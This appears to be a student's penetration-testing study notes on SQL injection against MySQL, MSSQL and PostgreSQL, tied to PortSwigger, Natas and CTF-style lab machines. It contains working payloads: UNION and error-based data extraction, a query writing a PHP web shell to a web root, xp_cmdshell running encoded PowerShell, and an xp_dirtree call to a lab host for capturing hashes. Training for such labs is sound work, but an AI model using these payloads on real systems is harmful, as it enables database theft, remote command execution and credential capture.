# SQLi

## MySQL/MariaDB (3306)

{% embed url="https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md" %}

{% embed url="https://github.com/oncybersec/time-blind-sqli/tree/main" %}
Time-based SQLI, if boolean and error fail
{% endembed %}

Lock in w me twin

```bash
mysql [--skip-ssl] -h [IP] -u[username] -p[pass]
```

{% code title="Raw Info Dumping (Use in Blind)" %}
```sql
SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[db]' LIMIT 0,1
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='[db]' and table_name='[table]' LIMIT 0,1
```
{% endcode %}

{% code title="Front End facing applications" %}
```sql
man' UNION select 1,@@version,3,4,5,6;-- - [assuming column 2 content gets diplayed on webpage]
1' order by <number> --It will order by column number specified, only return error when that column number does not exist
--Need to figure out data type used by each column to know where to inject
```
{% endcode %}

#### What's this?

{% code title="Sorting rev shell auth or anywhere else really" %}
```
‘ UNION SELECT (“<?php echo passthru($_GET[‘cmd’]);”) INTO OUTFILE ‘C:/xampp/htdocs/cmd.php’ — -’
```
{% endcode %}

{% hint style="info" %}
MedTech \[PEN-200]
{% endhint %}

{% code title="MSSQL Implementation" overflow="wrap" %}
```
admin'; EXEC xp_cmdshell 'powershell -e [base64_code]';-- 
```
{% endcode %}

### Error Based&#x20;

{% hint style="info" %}
Refer Monitored \[Medium]
{% endhint %}

Aim to induce an error, not a successful query, info will be returned in error message

```sql
id=1 AND extractvalue(1,version())
id=1 AND extractvalue(1,concat(0x0a, (SELECT * from [db] where table_name='[table]' limit 0,1)))
group_concat([colname]) will return all rows of an attribute in one query
```

### Blind Boolean/Error

{% hint style="info" %}
Refer Soccer \[Easy]
{% endhint %}

Get the SQLi payload on point and start fuzzing based on response code / error, refer scripts for more info

### UDF (User Defined Function)

SQLI -> execute commands within SQL command, transfer and use a reverse shell

{% embed url="https://sudsy-fireplace-912.notion.site/Pebbles-from-Proving-Grounds-without-SQLMap-by-Luis-Moret-lainkusanagi-23b29df77e6946a6bb8cb213a76a9ac8" %}

{% embed url="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf" %}

{% embed url="https://r3dbuck3t.notion.site/MySQL-UDF-functions-3542db4a45ba4b7ea9b946098f9f80a3" %}

### Rana's Playlist (PortSwigger)

{% embed url="https://www.youtube.com/playlist?list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf" %}
Walkthroughs of all PortSwigger SQLi labs
{% endembed %}

#### Lab 4

For UNION attacks to work, the number of columns selected must be the same as original query and the data type used as well eg. if second column of original query uses text your UNION second column must do the same.

`GIfts' order by 4—` (order by also helps determine number of columns apart from the NULL method, whichever number used that columns is used for grouping as seen)

#### Lab 6 (Multiple attributes in single column)

select concat(user, ':', password) from users--\
select user || ':' || password from users--

Both do the same thing (incase of keyword filters)

#### Lab 11 (Blind w conditional responses)

Burp intruder clusterbomb allocates diff payload sets to diff payload positions and performs all combinations exactly what we need (ASCII of all values and numbers to iterate positions)

#### Lab 12

I didnt understand lmao

#### Lab 15 & 16&#x20;

wtf is out of band interaction fr

### Natas&#x20;

#### Labs 14, 15 and 17 watch&#x20;

{% embed url="https://youtu.be/jBhYI8Zna0w" %}

## MSSQL (1433)

{% hint style="info" %}
Refer StreamIO \[Medium]
{% endhint %}

Watch for `C:/SQLServer/Logs/ERRORLOG.BAK`

```
.\SQLCMD.EXE -S localhost -U [user] -P [password] -d [database] -Q "select table_name from streamio_backup.information_schema.tables;"

python3 mssqlclient.py [-port {opt}] [domain]/[user]:[password]@[dc] {-windows-auth}
enable_xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

sudo responder -I tun0enum_db
EXEC master.sys.xp_dirtree '\\10.10.14.9\myshare',1, 1
```

## PostgreSQL (5432)

```
psql -h localhost -p 5432 -U [user] -d [database]
\list
\c [dbname]
\dt
\d [table] (listing schema for table users)
select * from [table];
```
